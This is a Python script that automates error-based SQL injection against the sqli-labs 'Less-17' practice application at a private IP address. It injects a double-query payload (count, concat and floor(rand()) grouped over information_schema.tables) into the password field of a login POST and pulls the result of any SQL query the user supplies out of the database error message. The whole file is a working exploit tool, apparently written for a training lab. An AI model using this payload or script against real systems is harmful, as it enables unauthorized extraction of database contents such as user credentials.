#!/usr/bin/env python

import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <SQL Query>

EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-17/"
pattern = r'::.+::'
result = ""

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

query = {
    "uname": "admin",
    "passwd": "0' or (select 1 from (select count(*), concat('::', (%s),'::', floor(rand()*2))a from information_schema.tables group by a)b)#" % sys.argv[1],
    "submit": "Submit"
}
print("[*] Query: %s" % query)

res = requests.post(url, headers=header, data=query, verify=False)
resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
resbody = re.sub(r"\\t", "\t", resbody)
resbody = re.sub(r"\\r", "", resbody)
resbody = re.sub(r"\\\'", "\'", resbody)
resbody = re.sub(r"\\\"", "\"", resbody)
resbody = re.sub(r"\\n", "\n", resbody).strip()

try:
    result = re.search(pattern, resbody).group(0).strip('::')
except:
    result = "***NO RESULT***"

print("[*] RESULT: %s" % result)
